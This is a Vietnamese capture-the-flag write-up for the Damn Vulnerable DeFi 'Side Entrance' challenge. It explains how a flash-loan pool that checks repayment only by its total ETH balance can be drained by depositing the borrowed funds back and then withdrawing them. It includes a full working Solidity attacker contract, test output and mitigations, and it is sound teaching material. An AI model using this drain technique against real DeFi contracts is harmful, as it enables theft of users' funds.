---
title: "[DVD-04] Side Entrance: trả nợ flash loan bằng cách deposit vào chính pool"
description: "SideEntranceLenderPool kiểm tra hoàn trả flash loan bằng tổng số dư ETH của pool thay vì theo dõi khoản vay cụ thể. Attacker vay toàn bộ pool, rồi trong callback deposit số ETH vừa vay vào tài khoản của chính mình — pool đủ tiền nên check pass, còn attacker giữ quyền rút toàn bộ số tiền đó."
pubDate: 2026-08-20
tags: ["web3", "ctf", "smart-contract", "damn-vulnerable-defi", "flash-loan", "accounting"]
draft: false
challenge: "damn-vulnerable-defi"
difficulty: "easy"
series: "damn-vulnerable-defi"
---

## Tóm tắt

Side Entrance là bài học về sai lầm trong cơ chế kiểm tra hoàn trả flash loan: pool chỉ so sánh **tổng số dư ETH** trước và sau khoản vay, thay vì xác thực nguồn gốc khoản hoàn trả từ chính người vay (borrower). Kẻ tấn công vay toàn bộ 1000 ETH của pool, sau đó trong hàm callback đã thực hiện nạp (deposit) số ETH vừa vay vào tài khoản của chính mình trong pool. Vì tổng số dư của pool được khôi phục, điều kiện hoàn trả được thỏa mãn, nhưng attacker đã tạo lập một khoản credit trị giá 1000 ETH và có thể rút toàn bộ số tiền này thông qua hàm `withdraw()`.

## Bối cảnh & Mục tiêu

**SideEntranceLenderPool** (`src/side-entrance/SideEntranceLenderPool.sol`) vừa là flash lender vừa là một giao thức cho phép deposit/withdraw ETH:

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);
    SafeTransferLib.safeTransferETH(msg.sender, amount);
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;
    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();
    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

Trạng thái ban đầu: pool giữ 1000 ETH (deposit của deployer); player có 1 ETH.

Điều kiện thắng (`_isSolved()`): pool hết ETH; recovery nhận đủ 1000 ETH.

## Phân tích lỗ hổng

`flashLoan()` ghi nhận `balanceBefore = address(this).balance`, chuyển `amount` tới `msg.sender`, gọi callback `execute()`, sau đó kiểm tra điều kiện `address(this).balance >= balanceBefore`.

Vấn đề nằm ở chỗ: cơ chế này chỉ xác nhận **pool có đủ thanh khoản**, không xác nhận **khoản vay đã được hoàn trả bởi borrower**. Hàm `deposit()` là một hàm public mà bất kỳ ai cũng có thể truy cập — nó không phân biệt được tiền nạp vào là để trả nợ flash loan hay là hoạt động deposit thông thường. Trong hàm callback, attacker thực hiện gọi `deposit{value: msg.value}()` với chính số ETH vừa vay:

- Dòng tiền chuyển về pool → `address(this).balance` trở lại bằng `balanceBefore` → điều kiện kiểm tra được thỏa mãn, không xảy ra revert.
- Tuy nhiên, `balances[attacker]` tăng thêm 1000 ETH — đây là một khoản **credit hợp lệ** mà attacker hoàn toàn có quyền rút thông qua hàm `withdraw()`.

Bản chất: khoản nợ đã được "trả" về mặt kế toán pool, nhưng đồng thời nó chuyển hóa thành tài sản của chính người vay trong sổ cái của pool. Pool ghi nhận số dư được khôi phục, nhưng quyền kiểm soát thực tế vẫn thuộc về attacker. Đây là lý do tại sao việc kiểm tra hoàn trả phải gắn liền với danh tính của borrower thay vì chỉ so sánh tổng số dư của contract.

## Khai thác

Contract tấn công triển khai interface callback `execute()`:

```solidity
contract SideEntranceAttacker {
    SideEntranceLenderPool pool;
    address recovery;

    constructor(SideEntranceLenderPool _pool, address _recovery) {
        pool = _pool;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(address(pool).balance); // vay toàn bộ 1000 ETH
        pool.withdraw();                       // rút credit 1000 ETH của mình
        payable(recovery).transfer(address(this).balance);
    }

    // flashLoan callback: repay by depositing borrowed ETH back into our
    // own balances[] slot, satisfying the balance check while still owning
    // a withdrawable claim on the pool's ETH.
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

Diễn biến:

1. `attack()` gọi `pool.flashLoan(1000e18)` — pool chuyển 1000 ETH tới attacker và gọi `execute()`.
2. Trong `execute()`, attacker gọi `pool.deposit{value: 1000e18}()` — 1000 ETH quay về pool, `balances[attacker] += 1000e18`. Check hoàn trả pass.
3. `attack()` gọi `pool.withdraw()` — pool trả lại 1000 ETH cho attacker từ `balances[attacker]`.
4. Attacker chuyển toàn bộ 1000 ETH về `recovery`. Pool rỗng.

## Kết quả

Chạy `forge test --match-contract SideEntranceChallenge -vv`:

```
Ran 2 tests for test/side-entrance/SideEntrance.t.sol:SideEntranceChallenge
[PASS] test_assertInitialState() (gas: 12972)
[PASS] test_sideEntrance() (gas: 240467)
Suite result: ok. 2 passed; 0 failed; 0 skipped
```

## Bài học & Cách phòng tránh

- **Kiểm tra hoàn trả phải gắn với người vay.** Cách an toàn là snapshot số dư (hoặc credit) của borrower trước khoản vay, sau đó yêu cầu tiền hoàn trả đến từ chính borrower qua `transferFrom` hoặc qua một hàm trả nợ riêng biệt, thay vì so tổng balance của pool.
- **Phân biệt rõ luồng tiền:** pool nên ngăn `deposit()` được gọi trong callback flash loan (ví dụ reentrancy guard trên toàn bộ state thay đổi, hoặc cờ "đang cho vay") để tránh việc vừa vay vừa trả bằng cùng một đồng tiền.
- **Invariant là tổng hòa của các phần, không phải một con số đơn lẻ:** `address(this).balance` chỉ là một số; việc theo dõi ai sở hữu phần nào của con số đó mới là điều quyết định an toàn.

## Tham khảo

- Challenge: [Side Entrance — Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/)
- Source: `src/side-entrance/SideEntranceLenderPool.sol`, `test/side-entrance/SideEntrance.t.sol`
